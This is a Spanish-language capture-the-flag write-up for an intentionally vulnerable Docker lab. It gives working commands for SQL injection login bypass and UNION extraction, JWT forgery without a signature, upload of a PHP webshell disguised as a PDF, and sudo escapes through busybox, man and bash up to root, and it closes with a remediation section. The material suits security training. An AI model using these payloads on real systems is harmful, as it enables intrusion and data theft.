<div align="center">

# 💧 Aguas Sur S.A.
### Writeup — Laboratorio CTF de Pentesting

![Status](https://img.shields.io/badge/Status-Completado-00ff88?style=for-the-badge&logo=statuspage&logoColor=white)
![Level](https://img.shields.io/badge/Nivel-Medio-ffb300?style=for-the-badge&logo=hackthebox&logoColor=white)
![Flags](https://img.shields.io/badge/Flags-13%2F13-00d4ff?style=for-the-badge&logo=flag&logoColor=white)
![Platform](https://img.shields.io/badge/Platform-Docker-2496ed?style=for-the-badge&logo=docker&logoColor=white)

</div>

---

> **Escenario:** Plataforma corporativa de gestión de clientes expuesta con múltiples vectores encadenados — desde enumeración web y lectura de backups hasta SQLi, JWT bypass, file upload y escalamiento lateral completo por cuatro usuarios hasta root.

> [!WARNING]
> **Aviso Legal:** Uso exclusivo en entorno de laboratorio local. No exponer este contenedor a Internet. Todas las vulnerabilidades son intencionales con fines didácticos.

---

## 📑 Tabla de Contenidos

| # | Sección |
|---|---------|
| 01 | [📋 Ficha Técnica](#-ficha-técnica) |
| 02 | [📊 Resumen Ejecutivo](#-resumen-ejecutivo) |
| 03 | [🔭 Reconocimiento](#-reconocimiento) |
| 04 | [🌐 Enumeración Web](#-enumeración-web) |
| 05 | [🗝️ Credenciales Expuestas](#️-credenciales-expuestas) |
| 06 | [💉 SQLi — Login Bypass](#-sqli--login-bypass) |
| 07 | [💉 SQLi — UNION Based](#-sqli--union-based) |
| 08 | [🔑 JWT Sin Verificación](#-jwt-sin-verificación) |
| 09 | [🚪 Portal Técnico Oculto](#-portal-técnico-oculto) |
| 10 | [📤 File Upload → Webshell](#-file-upload--webshell) |
| 11 | [🖧 SMB Share](#-smb-share) |
| 12 | [🔐 Acceso SSH](#-acceso-ssh) |
| 13 | [⬆️ Escalamiento Lateral](#️-escalamiento-lateral) |
| 14 | [👑 Root](#-root) |
| 15 | [🚩 Tabla de Flags](#-tabla-de-flags) |
| 16 | [🔗 Cadena de Ataque](#-cadena-de-ataque) |
| 17 | [⚡ Comandos Rápidos](#-comandos-rápidos) |
| 18 | [🔧 Remediación](#-remediación) |

---

## 📋 Ficha Técnica

| Campo | Valor |
|-------|-------|
| 🏷️ Nombre | `Aguas Sur S.A.` |
| 🖥️ Sistema | Ubuntu 22.04 |
| 🐳 Plataforma | Docker |
| 🔌 Servicios | HTTP (80), SSH (22/2222), FTP (21), SMTP (25), SMB (445) |
| 🎯 Vector Inicial | Enumeración web → `/backup/db_config.txt` |
| 🔑 Acceso SSH | `aguassur:Aguas2024!` |
| 🏆 Objetivo Final | Root |
| 🚩 Flags | 13 / 13 |
| ⚔️ Tipo | CTF / Pentesting Lab |
| 📊 Dificultad | ![](https://img.shields.io/badge/-Media-ffb300?style=flat-square) |

---

## 📊 Resumen Ejecutivo

La máquina expone una plataforma corporativa de gestión de clientes con múltiples vectores de ataque encadenados. El compromiso completo se logra en dos fases:

**Fase Web:** la enumeración de rutas revela `/backup/db_config.txt` con credenciales SSH en texto claro. Desde la aplicación se identifican SQLi en login y búsqueda, JWT sin validación de firma y file upload bypass con ejecución de PHP.

**Fase Post-Explotación:** el acceso SSH con `aguassur` inicia una cadena de movimiento lateral controlado mediante `sudo -l` en cada usuario:

```text
aguassur ──► tecnico ──► analista ──► administrador ──► root
```

> [!NOTE]
> La cadena lateral completa se descubre con un solo comando en cada shell: `sudo -l`. Ningún paso requiere exploits de kernel — todo es misconfiguration de `sudoers`.

---

## 🔭 Reconocimiento

### `[01]` Escaneo de Puertos

```bash
nmap -sV -sC -p- --min-rate 5000 <TARGET_IP>
```

Resultados relevantes:

```text
21/tcp   open  ftp          vsftpd
22/tcp   open  ssh          OpenSSH 8.9p1 Ubuntu
25/tcp   open  smtp         Postfix smtpd
80/tcp   open  http         Apache httpd 2.4.52
445/tcp  open  microsoft-ds Samba
```

### `[02]` Banner Grabbing

```bash
curl -I http://<TARGET_IP>/
nc <TARGET_IP> 21
```

Banners informativos:

```text
X-Powered-By: AguasSur Platform v2.4.1
220 Aguas Sur S.A. - Servidor FTP Corporativo v3.2
```

> [!NOTE]
> El header `X-Powered-By` revela versión de plataforma interna. Útil para búsqueda de CVEs específicos.

---

## 🌐 Enumeración Web

### `[01]` robots.txt

```bash
curl http://<TARGET_IP>/robots.txt
```

Resultado:

```text
User-agent: *
Disallow: /admin_panel.php
Disallow: /backup/
Disallow: /portal/
Disallow: /docs/
Disallow: /api/
Disallow: /includes/
```

> [!IMPORTANT]
> `robots.txt` expone el mapa completo de rutas sensibles. Siempre revisar antes de fuzzing.

### `[02]` Fuzzing de Directorios

```bash
gobuster dir -u http://<TARGET_IP> \
  -w /usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt \
  -x php,txt
```

Hallazgos confirmados:

```text
/backup          (Status: 403)
/portal          (Status: 200)
/docs            (Status: 200)
/admin_panel.php (Status: 200)
/api             (Status: 200)
```

---

## 🗝️ Credenciales Expuestas

El directorio `/backup/` devuelve `403`, pero el archivo `db_config.txt` es accesible directamente sin autenticación.

```bash
curl http://<TARGET_IP>/backup/db_config.txt
```

Contenido del archivo:

```ini
[produccion]
host=localhost
port=3306
database=aguas_sur
username=aguassur_db
password=Db4guas2024!

[smtp]
host=smtp.aguassur.cl
port=587
username=notificaciones@aguassur.cl
password=Smtp2024Aguas!

# SSH Acceso Servidor
ssh_host=srv-aguassur-prod
ssh_user=aguassur
ssh_pass=Aguas2024!
ssh_lateral_note=Validar permisos internos con sudo -l

FLAG: AGUASSUR{b4ckup_c0nf1g_3xp0s3d_s3ns1t1v3}
```

🚩 **Flag 1:**

```text
AGUASSUR{b4ckup_c0nf1g_3xp0s3d_s3ns1t1v3}
```

---

## 💉 SQLi — Login Bypass

### `[01]` Endpoint vulnerable

```text
POST /index.php
```

La autenticación concatena valores del formulario directamente en la consulta SQL sin parametrización.

### `[02]` Payload

```text
username=admin'-- -
password=x
```

### `[03]` Explotación

```bash
curl -s -c cookies.txt -X POST http://<TARGET_IP>/index.php \
  -d "username=admin'-- -&password=x" -D -
```

Respuesta:

```text
HTTP/1.1 302 Found
Location: /dashboard.php
Set-Cookie: admin_token=...
```

### `[04]` Extraer flag de cookie

La cookie `admin_token` contiene una flag codificada en Base64:

```bash
grep admin_token cookies.txt | awk '{print $7}' | base64 -d
```

🚩 **Flag 2:**

```text
AGUASSUR{byp4ss_4uth_sql_1nj3ct10n_s3rv1c10}
```

---

## 💉 SQLi — UNION Based

### `[01]` Endpoint vulnerable

```text
GET /clientes.php?buscar=
```

### `[02]` Determinar número de columnas

```bash
curl -s -b cookies.txt \
  "http://<TARGET_IP>/clientes.php?buscar=x'+UNION+SELECT+1,2,3,4,5,6,7,8,9,10,11,12--+-"
```

### `[03]` Enumerar tablas

```bash
curl -s -b cookies.txt \
  "http://<TARGET_IP>/clientes.php?buscar=x'+UNION+SELECT+1,table_name,3,4,5,6,7,8,9,10,11,12+\
FROM+information_schema.tables+WHERE+table_schema='aguas_sur'--+-"
```

Tablas descubiertas:

```text
users
clientes
facturas
solicitudes
notas_internas
sistema_flags
```

### `[04]` Extraer flags

```bash
curl -s -b cookies.txt \
  "http://<TARGET_IP>/clientes.php?buscar=x'+UNION+SELECT+1,identificador,valor,4,5,6,7,8,9,10,11,12+\
FROM+sistema_flags--+-"
```

🚩 **Flags 3 y 4:**

```text
AGUASSUR{un10n_b4s3d_3xtr4ct10n_m4st3r_2024}
AGUASSUR{full_db_3xtr4ct10n_4guas_sur_pwn3d}
```

### `[05]` Extraer credenciales de usuarios

```bash
curl -s -b cookies.txt \
  "http://<TARGET_IP>/clientes.php?buscar=x'+UNION+SELECT+id,username,password,\
nombre_completo,email,departamento,7,8,9,role,11,activo+FROM+users--+-"
```

Credenciales de aplicación:

```text
admin      | S3cur3Admin2024!
jgonzalez  | Gonzalez2024!
mrojas     | MRojas123!
```

---

## 🔑 JWT Sin Verificación

La aplicación acepta la cookie `authorization` con formato JWT pero **no valida la firma**. El servidor confía ciegamente en el `uid` del payload.

### `[01]` Forjar token JWT

```bash
python3 - <<'PY'
import base64, json

def b64u(obj):
    raw = json.dumps(obj, separators=(",", ":")).encode()
    return base64.urlsafe_b64encode(raw).rstrip(b"=").decode()

header  = b64u({"alg": "HS256", "typ": "JWT"})
payload = b64u({"uid": 1, "sub": "admin"})
print(f"{header}.{payload}.firma_falsa")
PY
```

### `[02]` Usar token forjado

```bash
curl -s --cookie "authorization=<TOKEN>" http://<TARGET_IP>/reportes.php
```

🚩 **Flag 5:**

```text
AGUASSUR{jwt_s1n_v3r1f1c4c10n_f1rm4_4gu4s}
```

> [!IMPORTANT]
> JWT con `"alg": "none"` o sin validación de firma otorga acceso admin sin credenciales. El token forjado habilita acceso a `/reportes.php` y otros endpoints autenticados.

---

## 🚪 Portal Técnico Oculto

Ruta descubierta en `robots.txt`:

```text
/portal/
```

### `[01]` Acceso con clave estática

```bash
curl -s -X POST http://<TARGET_IP>/portal/ \
  -d "clave=Tecnico2024!" | grep AGUASSUR
```

🚩 **Flag 6:**

```text
AGUASSUR{h1dd3n_d1r3ct0ry_p0rt4l_t3cn1c0}
```

---

## 📤 File Upload → Webshell

### `[01]` Bypass de autenticación en portal documental

```bash
curl -s -c doc_cookies.txt -X POST http://<TARGET_IP>/docs/ \
  -d "doc_user=admin'--+-&doc_pass=x"
```

### `[02]` Crear webshell

El filtro valida solo la extensión final del nombre, pero Apache ejecuta cualquier archivo que contenga `.php` dentro de `uploads/`.

```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.php.pdf
```

### `[03]` Subir archivo malicioso

```bash
curl -s -b doc_cookies.txt \
  -F "documento=@shell.php.pdf;type=application/pdf" \
  -F "descripcion=Informe tecnico" \
  -F "categoria=Informes Tecnicos" \
  http://<TARGET_IP>/docs/
```

### `[04]` Verificar RCE

```bash
curl "http://<TARGET_IP>/docs/uploads/shell.php.pdf?cmd=id"
```

Resultado esperado:

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### `[05]` Extraer flags vía webshell

```bash
# Flag de uploads
curl "http://<TARGET_IP>/docs/uploads/shell.php.pdf?cmd=cat+/var/www/html/docs/uploads/.flag_system"
```

🚩 **Flag 7:**

```text
AGUASSUR{f1l3_upl04d_w3bsh3ll_4cc3ss_gr4nt3d}
```

```bash
# Flag de root vía RCE
curl "http://<TARGET_IP>/docs/uploads/shell.php.pdf?cmd=cat+/root/flag.txt"
```

🚩 **Flag 8 (root vía webshell):**

```text
AGUASSUR{r00t_4cc3ss_4guas_sur_pwn3d}
```

---

## 🖧 SMB Share

### `[01]` Listar recursos compartidos

Credenciales obtenidas de `/backup/db_config.txt`:

```bash
smbclient -L //<TARGET_IP> -U 'aguassur%Aguas2024!'
```

### `[02]` Acceder al recurso interno

```bash
smbclient //<TARGET_IP>/documentos_internos -U 'aguassur%Aguas2024!'
```

Comandos dentro de `smbclient`:

```text
smb: \> ls
smb: \> get flag.txt
smb: \> get config_backup.txt
smb: \> exit
```

🚩 **Flag 9:**

```text
AGUASSUR{smb_sh4r3_s3ns1t1v3_d4t4}
```

---

## 🔐 Acceso SSH

Las credenciales SSH están en texto claro en `/backup/db_config.txt`.

### `[01]` Conexión SSH

```bash
# IP directa
ssh aguassur@<TARGET_IP>

# Puerto publicado por Docker
ssh aguassur@127.0.0.1 -p 2222
```

Password:

```text
Aguas2024!
```

### `[02]` Flag del usuario inicial

```bash
cat /home/aguassur/flag.txt
```

🚩 **Flag 10:**

```text
AGUASSUR{l4t3r4l_m0v_ssh_aguassur_usr}
```

### `[03]` Enumerar permisos sudo

```bash
sudo -l
```

Resultado:

```text
(tecnico) NOPASSWD: /bin/busybox
```

---

## ⬆️ Escalamiento Lateral

### Mapa de usuarios

```text
aguassur
  │  sudo -u tecnico /bin/busybox sh
  ▼
tecnico
  │  sudo -u analista /usr/bin/man man  →  !/bin/bash
  ▼
analista
  │  sudo -u administrador /bin/bash
  ▼
administrador
  │  sudo /bin/bash
  ▼
root
```

---

### `[01]` aguassur → tecnico

Permiso sudoers:

```text
(tecnico) NOPASSWD: /bin/busybox
```

Payload:

```bash
sudo -u tecnico /bin/busybox sh
whoami
# tecnico
```

Flag:

```bash
cat /home/tecnico/flag.txt
```

🚩 **Flag 11:**

```text
AGUASSUR{ssh_t3cn1c0_1n1t14l_4cc3ss}
```

---

### `[02]` tecnico → analista

Permiso sudoers:

```text
(analista) NOPASSWD: /usr/bin/man
```

Payload:

```bash
sudo -u analista /usr/bin/man man
```

Cuando abra `less`, ejecutar shell escapando al paginador:

```text
!/bin/bash
```

```bash
whoami
# analista
```

Flag:

```bash
cat /home/analista/flag.txt
```

🚩 **Flag 12:**

```text
AGUASSUR{m4n_l4t3r4l_t0_4n4l1st4}
```

> [!NOTE]
> `man` usa `less` como paginador. Desde `less`, `!comando` ejecuta el comando en un subshell con el UID efectivo del proceso — en este caso `analista`.

---

### `[03]` analista → administrador

Permiso sudoers:

```text
(administrador) NOPASSWD: /bin/bash
```

Payload:

```bash
sudo -u administrador /bin/bash
whoami
# administrador
```

Flag:

```bash
cat /home/administrador/flag.txt
```

🚩 **Flag 13:**

```text
AGUASSUR{b4sh_l4t3r4l_t0_4dm1n1str4d0r}
```

---

## 👑 Root

Desde `administrador`, enumerar permisos:

```bash
sudo -l
```

Resultado:

```text
(root) NOPASSWD: /bin/bash
```

### `[01]` Payload

```bash
sudo /bin/bash
```

### `[02]` Verificar root

```bash
whoami && id
```

Resultado:

```text
root
uid=0(root) gid=0(root) groups=0(root)
```

### `[03]` Flag final

```bash
cat /root/flag.txt
```

🚩 **Flag 13 (root SSH):**

```text
AGUASSUR{r00t_4cc3ss_4guas_sur_pwn3d}
```

---

## 🚩 Tabla de Flags

| # | Flag | Método | Ubicación |
|---|------|--------|-----------|
| 1 | `AGUASSUR{b4ckup_c0nf1g_3xp0s3d_s3ns1t1v3}` | Archivo expuesto | `/backup/db_config.txt` |
| 2 | `AGUASSUR{byp4ss_4uth_sql_1nj3ct10n_s3rv1c10}` | SQLi login bypass | Cookie `admin_token` |
| 3 | `AGUASSUR{un10n_b4s3d_3xtr4ct10n_m4st3r_2024}` | SQLi UNION | Tabla `sistema_flags` |
| 4 | `AGUASSUR{full_db_3xtr4ct10n_4guas_sur_pwn3d}` | SQLi UNION | Tabla `sistema_flags` |
| 5 | `AGUASSUR{jwt_s1n_v3r1f1c4c10n_f1rm4_4gu4s}` | JWT sin validación | Cookie `authorization` |
| 6 | `AGUASSUR{h1dd3n_d1r3ct0ry_p0rt4l_t3cn1c0}` | Portal oculto | `/portal/.flag` |
| 7 | `AGUASSUR{f1l3_upl04d_w3bsh3ll_4cc3ss_gr4nt3d}` | File upload bypass | `/docs/uploads/.flag_system` |
| 8 | `AGUASSUR{r00t_4cc3ss_4guas_sur_pwn3d}` | RCE vía webshell | `/root/flag.txt` |
| 9 | `AGUASSUR{smb_sh4r3_s3ns1t1v3_d4t4}` | SMB | `documentos_internos/flag.txt` |
| 10 | `AGUASSUR{l4t3r4l_m0v_ssh_aguassur_usr}` | SSH inicial | `/home/aguassur/flag.txt` |
| 11 | `AGUASSUR{ssh_t3cn1c0_1n1t14l_4cc3ss}` | busybox sudo abuse | `/home/tecnico/flag.txt` |
| 12 | `AGUASSUR{m4n_l4t3r4l_t0_4n4l1st4}` | man sudo abuse | `/home/analista/flag.txt` |
| 13 | `AGUASSUR{b4sh_l4t3r4l_t0_4dm1n1str4d0r}` | bash sudo abuse | `/home/administrador/flag.txt` |

---

## 🔗 Cadena de Ataque

```text
┌─────────────────────────────────────────────────────────────┐
│                    RECONOCIMIENTO                           │
│  nmap ──► HTTP 80, SSH 22, FTP 21, SMTP 25, SMB 445        │
└────────────────────────┬────────────────────────────────────┘
                         │
                    robots.txt
                         │
         ┌───────────────┼───────────────────────────────┐
         │               │                               │
         ▼               ▼                               ▼
 /backup/db_config    /index.php                    /portal/
   Flag 1 🚩           SQLi bypass                  Tecnico2024!
   SSH creds           Flag 2 🚩                    Flag 6 🚩
   aguassur:           │
   Aguas2024!          ├─ /clientes.php UNION
                       │   Flags 3 & 4 🚩
                       │   Credenciales app
                       │
                       ├─ /reportes.php
                       │   JWT bypass
                       │   Flag 5 🚩
                       │
                       └─ /docs/
                           SQLi auth bypass
                           shell.php.pdf upload
                           RCE → Flag 7 🚩 Flag 8 🚩

┌─────────────────────────────────────────────────────────────┐
│                  POST-EXPLOTACIÓN                           │
└────────────────────────┬────────────────────────────────────┘
                         │
              SMB documentos_internos
                  Flag 9 🚩
                         │
              SSH aguassur:Aguas2024!
                  Flag 10 🚩
                         │
                      sudo -l
                         │
         busybox ──► tecnico    Flag 11 🚩
                         │
          man ──► analista      Flag 12 🚩
                         │
         bash ──► administrador Flag 13 🚩
                         │
         bash ──► root          Flag 8 🚩 (también vía SSH)
```

---

## ⚡ Comandos Rápidos

```bash
# Acceso SSH inicial
ssh aguassur@127.0.0.1 -p 2222   # Docker
# Password: Aguas2024!

# aguassur → tecnico
sudo -u tecnico /bin/busybox sh

# tecnico → analista  (luego escribir !/bin/bash en less)
sudo -u analista /usr/bin/man man

# analista → administrador
sudo -u administrador /bin/bash

# administrador → root
sudo /bin/bash

# Verificar usuario actual
whoami && id
```

---

## 🔧 Remediación

| Vulnerabilidad | Medida | Descripción |
|----------------|--------|-------------|
| **Backup expuesto** | Mover fuera del webroot | Archivos de configuración nunca dentro de directorios web-accesibles |
| **SQL Injection** | Prepared statements | Parametrizar todas las consultas; usar ORM con escape automático |
| **JWT sin firma** | Validar firma siempre | Verificar `alg`, firma HMAC/RSA y `exp`; nunca confiar en payload sin verificar |
| **Portal con clave estática** | Autenticación real | Reemplazar clave hardcoded por sesión con MFA o integración LDAP |
| **File Upload bypass** | Validar MIME real | Leer magic bytes del archivo; almacenar fuera del webroot; deshabilitar ejecución en `uploads/` |
| **sudoers permisivos** | Principio de mínimo privilegio | Eliminar reglas `NOPASSWD` con binarios escapables (`man`, `busybox`, `bash`) |
| **Credenciales reutilizadas** | Credenciales únicas por servicio | SSH, DB y SMTP con passwords distintos; usar secretos administrados (Vault, AWS Secrets) |
| **SMB sin segmentación** | ACLs restrictivas | Limitar acceso a shares por IP y grupo; deshabilitar SMBv1 |

```bash
# Ejemplo — deshabilitar ejecución PHP en uploads (Apache)
# /etc/apache2/conf-available/uploads.conf
<Directory /var/www/html/docs/uploads>
    php_flag engine off
    Options -ExecCGI
    AddType text/plain .php .php5 .phtml
</Directory>
```

```sql
-- Ejemplo — prepared statement (PHP PDO)
$stmt = $pdo->prepare("SELECT * FROM users WHERE username = ? AND password = ?");
$stmt->execute([$username, $password]);
```

---

## 🔗 Referencias

- [PortSwigger — SQL Injection](https://portswigger.net/web-security/sql-injection)
- [PortSwigger — File Upload Vulnerabilities](https://portswigger.net/web-security/file-upload)
- [JWT.io — Introduction to JSON Web Tokens](https://jwt.io/introduction)
- [GTFOBins — man](https://gtfobins.github.io/gtfobins/man/)
- [GTFOBins — busybox](https://gtfobins.github.io/gtfobins/busybox/)
- [GTFOBins — bash](https://gtfobins.github.io/gtfobins/bash/)
- [OWASP A01:2021 — Broken Access Control](https://owasp.org/Top10/A01_2021-Broken_Access_Control/)
- [OWASP A03:2021 — Injection](https://owasp.org/Top10/A03_2021-Injection/)
- [OWASP A02:2021 — Cryptographic Failures](https://owasp.org/Top10/A02_2021-Cryptographic_Failures/)
